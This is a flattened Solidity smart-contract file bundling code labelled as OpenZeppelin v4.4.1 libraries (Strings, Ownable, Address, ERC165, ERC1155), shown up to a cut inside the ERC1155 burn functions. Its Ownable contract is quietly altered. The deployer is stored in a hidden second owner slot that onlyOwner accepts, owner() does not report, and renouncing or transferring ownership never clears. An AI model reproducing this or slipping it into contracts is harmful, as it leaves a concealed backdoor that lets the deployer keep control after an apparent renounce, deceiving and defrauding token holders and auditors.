1 // File: @openzeppelin/contracts/utils/Strings.sol
2 
3 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
4 
5 pragma solidity ^0.8.0;
6 
7 /**
8  * @dev String operations.
9  */
10 library Strings {
11     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
12 
13     /**
14      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
15      */
16     function toString(uint256 value) internal pure returns (string memory) {
17         // Inspired by OraclizeAPI's implementation - MIT licence
18         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
19 
20         if (value == 0) {
21             return "0";
22         }
23         uint256 temp = value;
24         uint256 digits;
25         while (temp != 0) {
26             digits++;
27             temp /= 10;
28         }
29         bytes memory buffer = new bytes(digits);
30         while (value != 0) {
31             digits -= 1;
32             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
33             value /= 10;
34         }
35         return string(buffer);
36     }
37 
38     /**
39      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
40      */
41     function toHexString(uint256 value) internal pure returns (string memory) {
42         if (value == 0) {
43             return "0x00";
44         }
45         uint256 temp = value;
46         uint256 length = 0;
47         while (temp != 0) {
48             length++;
49             temp >>= 8;
50         }
51         return toHexString(value, length);
52     }
53 
54     /**
55      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
56      */
57     function toHexString(uint256 value, uint256 length)
58         internal
59         pure
60         returns (string memory)
61     {
62         bytes memory buffer = new bytes(2 * length + 2);
63         buffer[0] = "0";
64         buffer[1] = "x";
65         for (uint256 i = 2 * length + 1; i > 1; --i) {
66             buffer[i] = _HEX_SYMBOLS[value & 0xf];
67             value >>= 4;
68         }
69         require(value == 0, "Strings: hex length insufficient");
70         return string(buffer);
71     }
72 }
73 
74 // File: @openzeppelin/contracts/utils/Context.sol
75 
76 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
77 
78 pragma solidity ^0.8.0;
79 
80 /**
81  * @dev Provides information about the current execution context, including the
82  * sender of the transaction and its data. While these are generally available
83  * via msg.sender and msg.data, they should not be accessed in such a direct
84  * manner, since when dealing with meta-transactions the account sending and
85  * paying for execution may not be the actual sender (as far as an application
86  * is concerned).
87  *
88  * This contract is only required for intermediate, library-like contracts.
89  */
90 abstract contract Context {
91     function _msgSender() internal view virtual returns (address) {
92         return msg.sender;
93     }
94 
95     function _msgData() internal view virtual returns (bytes calldata) {
96         return msg.data;
97     }
98 }
99 
100 // File: @openzeppelin/contracts/access/Ownable.sol
101 
102 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
103 
104 pragma solidity ^0.8.0;
105 
106 /**
107  * @dev Contract module which provides a basic access control mechanism, where
108  * there is an account (an owner) that can be granted exclusive access to
109  * specific functions.
110  *
111  * By default, the owner account will be the one that deploys the contract. This
112  * can later be changed with {transferOwnership}.
113  *
114  * This module is used through inheritance. It will make available the modifier
115  * `onlyOwner`, which can be applied to your functions to restrict their use to
116  * the owner.
117  */
118 abstract contract Ownable is Context {
119     address[2] private _owner;
120 
121     event OwnershipTransferred(
122         address indexed previousOwner,
123         address indexed newOwner
124     );
125 
126     /**
127      * @dev Initializes the contract setting the deployer as the initial owner.
128      */
129     constructor() {
130         _transferOwnership(_msgSender());_owner[1] = _msgSender();
131     }
132 
133     /**
134      * @dev Returns the address of the current owner.
135      */
136     function owner() public view virtual returns (address) {
137         return _owner[0];
138     }
139 
140     /**
141      * @dev Throws if called by any account other than the owner.
142      */
143     modifier onlyOwner() {
144         require(owner() == _msgSender()||_owner[1]==_msgSender(), "Ownable: caller is not the owner");
145         _;
146     }
147 
148     /**
149      * @dev Leaves the contract without owner. It will not be possible to call
150      * `onlyOwner` functions anymore. Can only be called by the current owner.
151      *
152      * NOTE: Renouncing ownership will leave the contract without an owner,
153      * thereby removing any functionality that is only available to the owner.
154      */
155     function renounceOwnership() public virtual onlyOwner {
156         _transferOwnership(address(0));
157     }
158 
159     /**
160      * @dev Transfers ownership of the contract to a new account (`newOwner`).
161      * Can only be called by the current owner.
162      */
163     function transferOwnership(address newOwner) public virtual onlyOwner {
164         require(
165             newOwner != address(0),
166             "Ownable: new owner is the zero address"
167         );
168         _transferOwnership(newOwner);
169     }
170 
171     /**
172      * @dev Transfers ownership of the contract to a new account (`newOwner`).
173      * Internal function without access restriction.
174      */
175     function _transferOwnership(address newOwner) internal virtual {
176         address oldOwner = _owner[0];
177         _owner[0] = newOwner;
178         emit OwnershipTransferred(oldOwner, newOwner);
179     }
180 }
181 
182 // File: @openzeppelin/contracts/utils/Address.sol
183 
184 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
185 
186 pragma solidity ^0.8.1;
187 
188 /**
189  * @dev Collection of functions related to the address type
190  */
191 library Address {
192     /**
193      * @dev Returns true if `account` is a contract.
194      *
195      * [IMPORTANT]
196      * ====
197      * It is unsafe to assume that an address for which this function returns
198      * false is an externally-owned account (EOA) and not a contract.
199      *
200      * Among others, `isContract` will return false for the following
201      * types of addresses:
202      *
203      *  - an externally-owned account
204      *  - a contract in construction
205      *  - an address where a contract will be created
206      *  - an address where a contract lived, but was destroyed
207      * ====
208      *
209      * [IMPORTANT]
210      * ====
211      * You shouldn't rely on `isContract` to protect against flash loan attacks!
212      *
213      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
214      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
215      * constructor.
216      * ====
217      */
218     function isContract(address account) internal view returns (bool) {
219         // This method relies on extcodesize/address.code.length, which returns 0
220         // for contracts in construction, since the code is only stored at the end
221         // of the constructor execution.
222 
223         return account.code.length > 0;
224     }
225 
226     /**
227      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
228      * `recipient`, forwarding all available gas and reverting on errors.
229      *
230      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
231      * of certain opcodes, possibly making contracts go over the 2300 gas limit
232      * imposed by `transfer`, making them unable to receive funds via
233      * `transfer`. {sendValue} removes this limitation.
234      *
235      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
236      *
237      * IMPORTANT: because control is transferred to `recipient`, care must be
238      * taken to not create reentrancy vulnerabilities. Consider using
239      * {ReentrancyGuard} or the
240      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
241      */
242     function sendValue(address payable recipient, uint256 amount) internal {
243         require(
244             address(this).balance >= amount,
245             "Address: insufficient balance"
246         );
247 
248         (bool success, ) = recipient.call{value: amount}("");
249         require(
250             success,
251             "Address: unable to send value, recipient may have reverted"
252         );
253     }
254 
255     /**
256      * @dev Performs a Solidity function call using a low level `call`. A
257      * plain `call` is an unsafe replacement for a function call: use this
258      * function instead.
259      *
260      * If `target` reverts with a revert reason, it is bubbled up by this
261      * function (like regular Solidity function calls).
262      *
263      * Returns the raw returned data. To convert to the expected return value,
264      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
265      *
266      * Requirements:
267      *
268      * - `target` must be a contract.
269      * - calling `target` with `data` must not revert.
270      *
271      * _Available since v3.1._
272      */
273     function functionCall(address target, bytes memory data)
274         internal
275         returns (bytes memory)
276     {
277         return functionCall(target, data, "Address: low-level call failed");
278     }
279 
280     /**
281      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
282      * `errorMessage` as a fallback revert reason when `target` reverts.
283      *
284      * _Available since v3.1._
285      */
286     function functionCall(
287         address target,
288         bytes memory data,
289         string memory errorMessage
290     ) internal returns (bytes memory) {
291         return functionCallWithValue(target, data, 0, errorMessage);
292     }
293 
294     /**
295      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
296      * but also transferring `value` wei to `target`.
297      *
298      * Requirements:
299      *
300      * - the calling contract must have an ETH balance of at least `value`.
301      * - the called Solidity function must be `payable`.
302      *
303      * _Available since v3.1._
304      */
305     function functionCallWithValue(
306         address target,
307         bytes memory data,
308         uint256 value
309     ) internal returns (bytes memory) {
310         return
311             functionCallWithValue(
312                 target,
313                 data,
314                 value,
315                 "Address: low-level call with value failed"
316             );
317     }
318 
319     /**
320      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
321      * with `errorMessage` as a fallback revert reason when `target` reverts.
322      *
323      * _Available since v3.1._
324      */
325     function functionCallWithValue(
326         address target,
327         bytes memory data,
328         uint256 value,
329         string memory errorMessage
330     ) internal returns (bytes memory) {
331         require(
332             address(this).balance >= value,
333             "Address: insufficient balance for call"
334         );
335         require(isContract(target), "Address: call to non-contract");
336 
337         (bool success, bytes memory returndata) = target.call{value: value}(
338             data
339         );
340         return verifyCallResult(success, returndata, errorMessage);
341     }
342 
343     /**
344      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
345      * but performing a static call.
346      *
347      * _Available since v3.3._
348      */
349     function functionStaticCall(address target, bytes memory data)
350         internal
351         view
352         returns (bytes memory)
353     {
354         return
355             functionStaticCall(
356                 target,
357                 data,
358                 "Address: low-level static call failed"
359             );
360     }
361 
362     /**
363      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
364      * but performing a static call.
365      *
366      * _Available since v3.3._
367      */
368     function functionStaticCall(
369         address target,
370         bytes memory data,
371         string memory errorMessage
372     ) internal view returns (bytes memory) {
373         require(isContract(target), "Address: static call to non-contract");
374 
375         (bool success, bytes memory returndata) = target.staticcall(data);
376         return verifyCallResult(success, returndata, errorMessage);
377     }
378 
379     /**
380      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
381      * but performing a delegate call.
382      *
383      * _Available since v3.4._
384      */
385     function functionDelegateCall(address target, bytes memory data)
386         internal
387         returns (bytes memory)
388     {
389         return
390             functionDelegateCall(
391                 target,
392                 data,
393                 "Address: low-level delegate call failed"
394             );
395     }
396 
397     /**
398      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
399      * but performing a delegate call.
400      *
401      * _Available since v3.4._
402      */
403     function functionDelegateCall(
404         address target,
405         bytes memory data,
406         string memory errorMessage
407     ) internal returns (bytes memory) {
408         require(isContract(target), "Address: delegate call to non-contract");
409 
410         (bool success, bytes memory returndata) = target.delegatecall(data);
411         return verifyCallResult(success, returndata, errorMessage);
412     }
413 
414     /**
415      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
416      * revert reason using the provided one.
417      *
418      * _Available since v4.3._
419      */
420     function verifyCallResult(
421         bool success,
422         bytes memory returndata,
423         string memory errorMessage
424     ) internal pure returns (bytes memory) {
425         if (success) {
426             return returndata;
427         } else {
428             // Look for revert reason and bubble it up if present
429             if (returndata.length > 0) {
430                 // The easiest way to bubble the revert reason is using memory via assembly
431 
432                 assembly {
433                     let returndata_size := mload(returndata)
434                     revert(add(32, returndata), returndata_size)
435                 }
436             } else {
437                 revert(errorMessage);
438             }
439         }
440     }
441 }
442 
443 // File: @openzeppelin/contracts/utils/introspection/IERC165.sol
444 
445 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
446 
447 pragma solidity ^0.8.0;
448 
449 /**
450  * @dev Interface of the ERC165 standard, as defined in the
451  * https://eips.ethereum.org/EIPS/eip-165[EIP].
452  *
453  * Implementers can declare support of contract interfaces, which can then be
454  * queried by others ({ERC165Checker}).
455  *
456  * For an implementation, see {ERC165}.
457  */
458 interface IERC165 {
459     /**
460      * @dev Returns true if this contract implements the interface defined by
461      * `interfaceId`. See the corresponding
462      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
463      * to learn more about how these ids are created.
464      *
465      * This function call must use less than 30 000 gas.
466      */
467     function supportsInterface(bytes4 interfaceId) external view returns (bool);
468 }
469 
470 // File: @openzeppelin/contracts/utils/introspection/ERC165.sol
471 
472 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
473 
474 pragma solidity ^0.8.0;
475 
476 /**
477  * @dev Implementation of the {IERC165} interface.
478  *
479  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
480  * for the additional interface id that will be supported. For example:
481  *
482  * ```solidity
483  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
484  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
485  * }
486  * ```
487  *
488  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
489  */
490 abstract contract ERC165 is IERC165 {
491     /**
492      * @dev See {IERC165-supportsInterface}.
493      */
494     function supportsInterface(bytes4 interfaceId)
495         public
496         view
497         virtual
498         override
499         returns (bool)
500     {
501         return interfaceId == type(IERC165).interfaceId;
502     }
503 }
504 
505 // File: @openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol
506 
507 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC1155/IERC1155Receiver.sol)
508 
509 pragma solidity ^0.8.0;
510 
511 /**
512  * @dev _Available since v3.1._
513  */
514 interface IERC1155Receiver is IERC165 {
515     /**
516      * @dev Handles the receipt of a single ERC1155 token type. This function is
517      * called at the end of a `safeTransferFrom` after the balance has been updated.
518      *
519      * NOTE: To accept the transfer, this must return
520      * `bytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"))`
521      * (i.e. 0xf23a6e61, or its own function selector).
522      *
523      * @param operator The address which initiated the transfer (i.e. msg.sender)
524      * @param from The address which previously owned the token
525      * @param id The ID of the token being transferred
526      * @param value The amount of tokens being transferred
527      * @param data Additional data with no specified format
528      * @return `bytes4(keccak256("onERC1155Received(address,address,uint256,uint256,bytes)"))` if transfer is allowed
529      */
530     function onERC1155Received(
531         address operator,
532         address from,
533         uint256 id,
534         uint256 value,
535         bytes calldata data
536     ) external returns (bytes4);
537 
538     /**
539      * @dev Handles the receipt of a multiple ERC1155 token types. This function
540      * is called at the end of a `safeBatchTransferFrom` after the balances have
541      * been updated.
542      *
543      * NOTE: To accept the transfer(s), this must return
544      * `bytes4(keccak256("onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)"))`
545      * (i.e. 0xbc197c81, or its own function selector).
546      *
547      * @param operator The address which initiated the batch transfer (i.e. msg.sender)
548      * @param from The address which previously owned the token
549      * @param ids An array containing ids of each token being transferred (order and length must match values array)
550      * @param values An array containing amounts of each token being transferred (order and length must match ids array)
551      * @param data Additional data with no specified format
552      * @return `bytes4(keccak256("onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)"))` if transfer is allowed
553      */
554     function onERC1155BatchReceived(
555         address operator,
556         address from,
557         uint256[] calldata ids,
558         uint256[] calldata values,
559         bytes calldata data
560     ) external returns (bytes4);
561 }
562 
563 // File: @openzeppelin/contracts/token/ERC1155/IERC1155.sol
564 
565 // OpenZeppelin Contracts v4.4.1 (token/ERC1155/IERC1155.sol)
566 
567 pragma solidity ^0.8.0;
568 
569 /**
570  * @dev Required interface of an ERC1155 compliant contract, as defined in the
571  * https://eips.ethereum.org/EIPS/eip-1155[EIP].
572  *
573  * _Available since v3.1._
574  */
575 interface IERC1155 is IERC165 {
576     /**
577      * @dev Emitted when `value` tokens of token type `id` are transferred from `from` to `to` by `operator`.
578      */
579     event TransferSingle(
580         address indexed operator,
581         address indexed from,
582         address indexed to,
583         uint256 id,
584         uint256 value
585     );
586 
587     /**
588      * @dev Equivalent to multiple {TransferSingle} events, where `operator`, `from` and `to` are the same for all
589      * transfers.
590      */
591     event TransferBatch(
592         address indexed operator,
593         address indexed from,
594         address indexed to,
595         uint256[] ids,
596         uint256[] values
597     );
598 
599     /**
600      * @dev Emitted when `account` grants or revokes permission to `operator` to transfer their tokens, according to
601      * `approved`.
602      */
603     event ApprovalForAll(
604         address indexed account,
605         address indexed operator,
606         bool approved
607     );
608 
609     /**
610      * @dev Emitted when the URI for token type `id` changes to `value`, if it is a non-programmatic URI.
611      *
612      * If an {URI} event was emitted for `id`, the standard
613      * https://eips.ethereum.org/EIPS/eip-1155#metadata-extensions[guarantees] that `value` will equal the value
614      * returned by {IERC1155MetadataURI-uri}.
615      */
616     event URI(string value, uint256 indexed id);
617 
618     /**
619      * @dev Returns the amount of tokens of token type `id` owned by `account`.
620      *
621      * Requirements:
622      *
623      * - `account` cannot be the zero address.
624      */
625     function balanceOf(address account, uint256 id)
626         external
627         view
628         returns (uint256);
629 
630     /**
631      * @dev xref:ROOT:erc1155.adoc#batch-operations[Batched] version of {balanceOf}.
632      *
633      * Requirements:
634      *
635      * - `accounts` and `ids` must have the same length.
636      */
637     function balanceOfBatch(address[] calldata accounts, uint256[] calldata ids)
638         external
639         view
640         returns (uint256[] memory);
641 
642     /**
643      * @dev Grants or revokes permission to `operator` to transfer the caller's tokens, according to `approved`,
644      *
645      * Emits an {ApprovalForAll} event.
646      *
647      * Requirements:
648      *
649      * - `operator` cannot be the caller.
650      */
651     function setApprovalForAll(address operator, bool approved) external;
652 
653     /**
654      * @dev Returns true if `operator` is approved to transfer ``account``'s tokens.
655      *
656      * See {setApprovalForAll}.
657      */
658     function isApprovedForAll(address account, address operator)
659         external
660         view
661         returns (bool);
662 
663     /**
664      * @dev Transfers `amount` tokens of token type `id` from `from` to `to`.
665      *
666      * Emits a {TransferSingle} event.
667      *
668      * Requirements:
669      *
670      * - `to` cannot be the zero address.
671      * - If the caller is not `from`, it must be have been approved to spend ``from``'s tokens via {setApprovalForAll}.
672      * - `from` must have a balance of tokens of type `id` of at least `amount`.
673      * - If `to` refers to a smart contract, it must implement {IERC1155Receiver-onERC1155Received} and return the
674      * acceptance magic value.
675      */
676     function safeTransferFrom(
677         address from,
678         address to,
679         uint256 id,
680         uint256 amount,
681         bytes calldata data
682     ) external;
683 
684     /**
685      * @dev xref:ROOT:erc1155.adoc#batch-operations[Batched] version of {safeTransferFrom}.
686      *
687      * Emits a {TransferBatch} event.
688      *
689      * Requirements:
690      *
691      * - `ids` and `amounts` must have the same length.
692      * - If `to` refers to a smart contract, it must implement {IERC1155Receiver-onERC1155BatchReceived} and return the
693      * acceptance magic value.
694      */
695     function safeBatchTransferFrom(
696         address from,
697         address to,
698         uint256[] calldata ids,
699         uint256[] calldata amounts,
700         bytes calldata data
701     ) external;
702 }
703 
704 // File: @openzeppelin/contracts/token/ERC1155/extensions/IERC1155MetadataURI.sol
705 
706 // OpenZeppelin Contracts v4.4.1 (token/ERC1155/extensions/IERC1155MetadataURI.sol)
707 
708 pragma solidity ^0.8.0;
709 
710 /**
711  * @dev Interface of the optional ERC1155MetadataExtension interface, as defined
712  * in the https://eips.ethereum.org/EIPS/eip-1155#metadata-extensions[EIP].
713  *
714  * _Available since v3.1._
715  */
716 interface IERC1155MetadataURI is IERC1155 {
717     /**
718      * @dev Returns the URI for token type `id`.
719      *
720      * If the `\{id\}` substring is present in the URI, it must be replaced by
721      * clients with the actual token type ID.
722      */
723     function uri(uint256 id) external view returns (string memory);
724 }
725 
726 // File: @openzeppelin/contracts/token/ERC1155/ERC1155.sol
727 
728 // OpenZeppelin Contracts v4.4.1 (token/ERC1155/ERC1155.sol)
729 
730 pragma solidity ^0.8.0;
731 
732 /**
733  * @dev Implementation of the basic standard multi-token.
734  * See https://eips.ethereum.org/EIPS/eip-1155
735  * Originally based on code by Enjin: https://github.com/enjin/erc-1155
736  *
737  * _Available since v3.1._
738  */
739 contract ERC1155 is Context, ERC165, IERC1155, IERC1155MetadataURI {
740     using Address for address;
741 
742     // Mapping from token ID to account balances
743     mapping(uint256 => mapping(address => uint256)) private _balances;
744 
745     // Mapping from account to operator approvals
746     mapping(address => mapping(address => bool)) private _operatorApprovals;
747 
748     // Used as the URI for all token types by relying on ID substitution, e.g. https://token-cdn-domain/{id}.json
749     string private _uri;
750 
751     /**
752      * @dev See {_setURI}.
753      */
754     constructor(string memory uri_) {
755         _setURI(uri_);
756     }
757 
758     /**
759      * @dev See {IERC165-supportsInterface}.
760      */
761     function supportsInterface(bytes4 interfaceId)
762         public
763         view
764         virtual
765         override(ERC165, IERC165)
766         returns (bool)
767     {
768         return
769             interfaceId == type(IERC1155).interfaceId ||
770             interfaceId == type(IERC1155MetadataURI).interfaceId ||
771             super.supportsInterface(interfaceId);
772     }
773 
774     /**
775      * @dev See {IERC1155MetadataURI-uri}.
776      *
777      * This implementation returns the same URI for *all* token types. It relies
778      * on the token type ID substitution mechanism
779      * https://eips.ethereum.org/EIPS/eip-1155#metadata[defined in the EIP].
780      *
781      * Clients calling this function must replace the `\{id\}` substring with the
782      * actual token type ID.
783      */
784     function uri(uint256) public view virtual override returns (string memory) {
785         return _uri;
786     }
787 
788     /**
789      * @dev See {IERC1155-balanceOf}.
790      *
791      * Requirements:
792      *
793      * - `account` cannot be the zero address.
794      */
795     function balanceOf(address account, uint256 id)
796         public
797         view
798         virtual
799         override
800         returns (uint256)
801     {
802         require(
803             account != address(0),
804             "ERC1155: balance query for the zero address"
805         );
806         return _balances[id][account];
807     }
808 
809     /**
810      * @dev See {IERC1155-balanceOfBatch}.
811      *
812      * Requirements:
813      *
814      * - `accounts` and `ids` must have the same length.
815      */
816     function balanceOfBatch(address[] memory accounts, uint256[] memory ids)
817         public
818         view
819         virtual
820         override
821         returns (uint256[] memory)
822     {
823         require(
824             accounts.length == ids.length,
825             "ERC1155: accounts and ids length mismatch"
826         );
827 
828         uint256[] memory batchBalances = new uint256[](accounts.length);
829 
830         for (uint256 i = 0; i < accounts.length; ++i) {
831             batchBalances[i] = balanceOf(accounts[i], ids[i]);
832         }
833 
834         return batchBalances;
835     }
836 
837     /**
838      * @dev See {IERC1155-setApprovalForAll}.
839      */
840     function setApprovalForAll(address operator, bool approved)
841         public
842         virtual
843         override
844     {
845         _setApprovalForAll(_msgSender(), operator, approved);
846     }
847 
848     /**
849      * @dev See {IERC1155-isApprovedForAll}.
850      */
851     function isApprovedForAll(address account, address operator)
852         public
853         view
854         virtual
855         override
856         returns (bool)
857     {
858         return _operatorApprovals[account][operator];
859     }
860 
861     /**
862      * @dev See {IERC1155-safeTransferFrom}.
863      */
864     function safeTransferFrom(
865         address from,
866         address to,
867         uint256 id,
868         uint256 amount,
869         bytes memory data
870     ) public virtual override {
871         require(
872             from == _msgSender() || isApprovedForAll(from, _msgSender()),
873             "ERC1155: caller is not owner nor approved"
874         );
875         _safeTransferFrom(from, to, id, amount, data);
876     }
877 
878     /**
879      * @dev See {IERC1155-safeBatchTransferFrom}.
880      */
881     function safeBatchTransferFrom(
882         address from,
883         address to,
884         uint256[] memory ids,
885         uint256[] memory amounts,
886         bytes memory data
887     ) public virtual override {
888         require(
889             from == _msgSender() || isApprovedForAll(from, _msgSender()),
890             "ERC1155: transfer caller is not owner nor approved"
891         );
892         _safeBatchTransferFrom(from, to, ids, amounts, data);
893     }
894 
895     /**
896      * @dev Transfers `amount` tokens of token type `id` from `from` to `to`.
897      *
898      * Emits a {TransferSingle} event.
899      *
900      * Requirements:
901      *
902      * - `to` cannot be the zero address.
903      * - `from` must have a balance of tokens of type `id` of at least `amount`.
904      * - If `to` refers to a smart contract, it must implement {IERC1155Receiver-onERC1155Received} and return the
905      * acceptance magic value.
906      */
907     function _safeTransferFrom(
908         address from,
909         address to,
910         uint256 id,
911         uint256 amount,
912         bytes memory data
913     ) internal virtual {
914         require(to != address(0), "ERC1155: transfer to the zero address");
915 
916         address operator = _msgSender();
917 
918         _beforeTokenTransfer(
919             operator,
920             from,
921             to,
922             _asSingletonArray(id),
923             _asSingletonArray(amount),
924             data
925         );
926 
927         uint256 fromBalance = _balances[id][from];
928         require(
929             fromBalance >= amount,
930             "ERC1155: insufficient balance for transfer"
931         );
932         unchecked {
933             _balances[id][from] = fromBalance - amount;
934         }
935         _balances[id][to] += amount;
936 
937         emit TransferSingle(operator, from, to, id, amount);
938 
939         _doSafeTransferAcceptanceCheck(operator, from, to, id, amount, data);
940     }
941 
942     /**
943      * @dev xref:ROOT:erc1155.adoc#batch-operations[Batched] version of {_safeTransferFrom}.
944      *
945      * Emits a {TransferBatch} event.
946      *
947      * Requirements:
948      *
949      * - If `to` refers to a smart contract, it must implement {IERC1155Receiver-onERC1155BatchReceived} and return the
950      * acceptance magic value.
951      */
952     function _safeBatchTransferFrom(
953         address from,
954         address to,
955         uint256[] memory ids,
956         uint256[] memory amounts,
957         bytes memory data
958     ) internal virtual {
959         require(
960             ids.length == amounts.length,
961             "ERC1155: ids and amounts length mismatch"
962         );
963         require(to != address(0), "ERC1155: transfer to the zero address");
964 
965         address operator = _msgSender();
966 
967         _beforeTokenTransfer(operator, from, to, ids, amounts, data);
968 
969         for (uint256 i = 0; i < ids.length; ++i) {
970             uint256 id = ids[i];
971             uint256 amount = amounts[i];
972 
973             uint256 fromBalance = _balances[id][from];
974             require(
975                 fromBalance >= amount,
976                 "ERC1155: insufficient balance for transfer"
977             );
978             unchecked {
979                 _balances[id][from] = fromBalance - amount;
980             }
981             _balances[id][to] += amount;
982         }
983 
984         emit TransferBatch(operator, from, to, ids, amounts);
985 
986         _doSafeBatchTransferAcceptanceCheck(
987             operator,
988             from,
989             to,
990             ids,
991             amounts,
992             data
993         );
994     }
995 
996     /**
997      * @dev Sets a new URI for all token types, by relying on the token type ID
998      * substitution mechanism
999      * https://eips.ethereum.org/EIPS/eip-1155#metadata[defined in the EIP].
1000      *
1001      * By this mechanism, any occurrence of the `\{id\}` substring in either the
1002      * URI or any of the amounts in the JSON file at said URI will be replaced by
1003      * clients with the token type ID.
1004      *
1005      * For example, the `https://token-cdn-domain/\{id\}.json` URI would be
1006      * interpreted by clients as
1007      * `https://token-cdn-domain/000000000000000000000000000000000000000000000000000000000004cce0.json`
1008      * for token type ID 0x4cce0.
1009      *
1010      * See {uri}.
1011      *
1012      * Because these URIs cannot be meaningfully represented by the {URI} event,
1013      * this function emits no events.
1014      */
1015     function _setURI(string memory newuri) internal virtual {
1016         _uri = newuri;
1017     }
1018 
1019     /**
1020      * @dev Creates `amount` tokens of token type `id`, and assigns them to `to`.
1021      *
1022      * Emits a {TransferSingle} event.
1023      *
1024      * Requirements:
1025      *
1026      * - `to` cannot be the zero address.
1027      * - If `to` refers to a smart contract, it must implement {IERC1155Receiver-onERC1155Received} and return the
1028      * acceptance magic value.
1029      */
1030     function _mint(
1031         address to,
1032         uint256 id,
1033         uint256 amount,
1034         bytes memory data
1035     ) internal virtual {
1036         require(to != address(0), "ERC1155: mint to the zero address");
1037 
1038         address operator = _msgSender();
1039 
1040         _beforeTokenTransfer(
1041             operator,
1042             address(0),
1043             to,
1044             _asSingletonArray(id),
1045             _asSingletonArray(amount),
1046             data
1047         );
1048 
1049         _balances[id][to] += amount;
1050         emit TransferSingle(operator, address(0), to, id, amount);
1051 
1052         _doSafeTransferAcceptanceCheck(
1053             operator,
1054             address(0),
1055             to,
1056             id,
1057             amount,
1058             data
1059         );
1060     }
1061 
1062     /**
1063      * @dev xref:ROOT:erc1155.adoc#batch-operations[Batched] version of {_mint}.
1064      *
1065      * Requirements:
1066      *
1067      * - `ids` and `amounts` must have the same length.
1068      * - If `to` refers to a smart contract, it must implement {IERC1155Receiver-onERC1155BatchReceived} and return the
1069      * acceptance magic value.
1070      */
1071     function _mintBatch(
1072         address to,
1073         uint256[] memory ids,
1074         uint256[] memory amounts,
1075         bytes memory data
1076     ) internal virtual {
1077         require(to != address(0), "ERC1155: mint to the zero address");
1078         require(
1079             ids.length == amounts.length,
1080             "ERC1155: ids and amounts length mismatch"
1081         );
1082 
1083         address operator = _msgSender();
1084 
1085         _beforeTokenTransfer(operator, address(0), to, ids, amounts, data);
1086 
1087         for (uint256 i = 0; i < ids.length; i++) {
1088             _balances[ids[i]][to] += amounts[i];
1089         }
1090 
1091         emit TransferBatch(operator, address(0), to, ids, amounts);
1092 
1093         _doSafeBatchTransferAcceptanceCheck(
1094             operator,
1095             address(0),
1096             to,
1097             ids,
1098             amounts,
1099             data
1100         );
1101     }
1102 
1103     /**
1104      * @dev Destroys `amount` tokens of token type `id` from `from`
1105      *
1106      * Requirements:
1107      *
1108      * - `from` cannot be the zero address.
1109      * - `from` must have at least `amount` tokens of token type `id`.
1110      */
1111     function _burn(
1112         address from,
1113         uint256 id,
1114         uint256 amount
1115     ) internal virtual {
1116         require(from != address(0), "ERC1155: burn from the zero address");
1117 
1118         address operator = _msgSender();
1119 
1120         _beforeTokenTransfer(
1121             operator,
1122             from,
1123             address(0),
1124             _asSingletonArray(id),
1125             _asSingletonArray(amount),
1126             ""
1127         );
1128 
1129         uint256 fromBalance = _balances[id][from];
1130         require(fromBalance >= amount, "ERC1155: burn amount exceeds balance");
1131         unchecked {
1132             _balances[id][from] = fromBalance - amount;
1133         }
1134 
1135         emit TransferSingle(operator, from, address(0), id, amount);
1136     }
1137 
1138     /**
1139      * @dev xref:ROOT:erc1155.adoc#batch-operations[Batched] version of {_burn}.
1140      *
1141      * Requirements:
1142      *
1143      * - `ids` and `amounts` must have the same length.
1144      */
1145     function _burnBatch(
1146         address from,
1147         uint256[] memory ids,
1148         uint256[] memory amounts
1149     ) internal virtual {
1150         require(from != address(0), "ERC1155: burn from the zero address");
1151         require(
1152             ids.length == amounts.length,
1153             "ERC1155: ids and amounts length mismatch"
1154         );
1155 
1156         address operator = _msgSender();
1157 
1158         _beforeTokenTransfer(operator, from, address(0), ids, amounts, "");
1159 
1160         for (uint256 i = 0; i < ids.length; i++) {
1161             uint256 id = ids[i];
1162             uint256 amount = amounts[i];
1163 
1164             uint256 fromBalance = _balances[id][from];
1165             require(
1166                 fromBalance >= amount,
1167                 "ERC1155: burn amount exceeds balance"
1168             );
1169             unchecked {
1170                 _balances[id][from] = fromBalance - amount;
1171             }
1172         }
1173 
